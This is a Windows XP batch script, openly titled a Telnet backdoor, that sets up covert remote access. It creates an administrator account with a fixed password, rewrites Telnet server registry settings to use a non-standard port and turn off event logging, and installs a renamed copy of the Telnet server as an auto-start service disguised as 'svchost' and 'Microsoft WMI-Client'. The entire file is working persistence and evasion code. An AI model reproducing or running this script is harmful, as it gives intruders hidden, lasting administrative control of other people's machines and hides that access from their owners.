   :: Telnet Backdoor for WindowsXP Ver 1.4 FiNAL WindowsXP-Prof
   :: (C) heroin_AT_mol.mn http://protoculture.tk

    :: ADD USER WiTH SUFFiCiENT RiGHTS!

   net localgroup TelnetClients /add
   net user iwam_user mypass /add
   net localgroup Administratoren iwam_user /add
   net localgroup TelnetClients iwam_user /add

    :: SET REGiSTRY!

   cd %windir%\system32
   ECHO Windows Registry Editor Version 5.00>0.reg
   ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0]>>0.reg
   ECHO "LoginScript"=hex(2):63,00,6d,00,64,00,00,00>>0.reg
   ECHO "TelnetPort"=dword:000003ff>>0.reg
   ECHO "MaxConnections"=dword:0000000a>>0.reg
   ECHO "EventLoggingEnabled"=dword:00000000>>0.reg
   ECHO "DisconnectKillAllApps"=dword:00000000>>0.reg
   ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\ReadConfig]>>0.reg
   ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\Defaults]>>0.reg
   regedit /s 0.reg && DEL 0.reg

    :: SET SERViCE!

   COPY %windir%\system32\tlntsvr.exe %windir%\system32\"svchost.exeÿ"
   assoc .exeÿ=exefile
   sc create "WMI-Client" binpath= "%windir%\system32\svchost.exeÿ" start= auto
   "svchost.exeÿ" /service
   sc description WMI-Client "Microsoft WMI-Client"
   sc start WMI-Client
